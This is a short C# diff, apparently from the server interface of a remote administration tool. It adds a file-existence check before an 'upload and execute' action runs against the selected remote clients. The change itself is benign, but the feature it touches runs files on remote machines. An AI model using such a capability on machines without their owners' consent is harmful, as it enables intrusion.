@@ -530,7 +530,7 @@ namespace xServer.Forms
             {
                 using (var frm = new FrmUploadAndExecute(lstClients.SelectedItems.Count))
                 {
-                    if (frm.ShowDialog() == DialogResult.OK)
+                    if ((frm.ShowDialog() == DialogResult.OK) && File.Exists(UploadAndExecute.FilePath))
                     {
                         new Thread(() =>
                         {
